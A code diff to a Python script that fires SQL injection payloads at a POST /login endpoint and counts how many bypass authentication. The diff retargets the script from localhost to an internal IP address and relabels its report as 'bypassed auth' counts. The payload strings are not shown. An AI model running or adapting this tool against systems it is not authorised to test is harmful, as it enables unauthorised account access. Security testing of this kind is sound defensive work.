@@ -9,8 +9,8 @@ import requests
 import sys
 import time
 
-BASE_URL = "http://localhost:5000"
-DELAY = 1.5
+BASE_URL = "http://10.0.0.5"
+WAIT = 10
 
 PAYLOADS = [
     {
@@ -72,7 +72,6 @@ RESET = "\033[0m"
 
 
 def test_payload(payload):
-    """Test a single SQL injection payload"""
     try:
         data = {
             "username": payload["username"],
@@ -124,27 +123,26 @@ def test_payload(payload):
 
 
 def print_report(results):
-    """Print test results summary"""
     print("\n" + "=" * 70)
     print(f"{BOLD}SQL Injection Test Results - POST /login{RESET}")
     print("=" * 70)
 
-    passed_count = 0
+    sqli_passed = 0
 
     for r in results:
         status = f"{GREEN}PASS{RESET}" if r["passed"] else f"{RED}FAIL{RESET}"
         if r["passed"]:
-            passed_count += 1
+            sqli_passed += 1
 
         print(f"\n  {BOLD}[{status}]{RESET} Payload #{r['id']}: {r['description']}")
         print(f"    Username: {r['username']}")
         print(f"    Response: HTTP {r['status_code']} - {r['detail']}")
 
     print("\n" + "-" * 70)
-    print(f"{BOLD}Summary: {passed_count}/{len(results)} payloads passed{RESET}")
-    if passed_count == len(results):
+    print(f"{BOLD}SQLi Bypass: {sqli_passed}/{len(results)} payloads bypassed auth{RESET}")
+    if sqli_passed == len(results):
         print(f"{GREEN}All SQL injection payloads successfully bypassed authentication.{RESET}")
-    elif passed_count > 0:
+    elif sqli_passed > 0:
         print(f"{YELLOW}Some payloads worked. Endpoint is vulnerable to SQLi.{RESET}")
     else:
         print(f"{RED}No payloads bypassed authentication.{RESET}")
@@ -157,9 +155,21 @@ if __name__ == "__main__":
 
     results = []
     for p in PAYLOADS:
+        print(f"{'='*50}")
+        print(f"{BOLD}[~] Payload #{p['id']}: {p['description']}{RESET}")
+
         r = test_payload(p)
         results.append(r)
-        time.sleep(DELAY)
+
+        status = f"{GREEN}PASS{RESET}" if r["passed"] else f"{RED}FAIL{RESET}"
+        print(f"    [{status}] HTTP {r['status_code']} - {r['detail']}")
+
+        if p["id"] != len(PAYLOADS):
+            print(f"    {YELLOW}[~] Waiting {WAIT}s before next payload...{RESET}")
+            time.sleep(WAIT)
+
+        print()
+
     print_report(results)
 
     sys.exit(0 if any(r["passed"] for r in results) else 1)
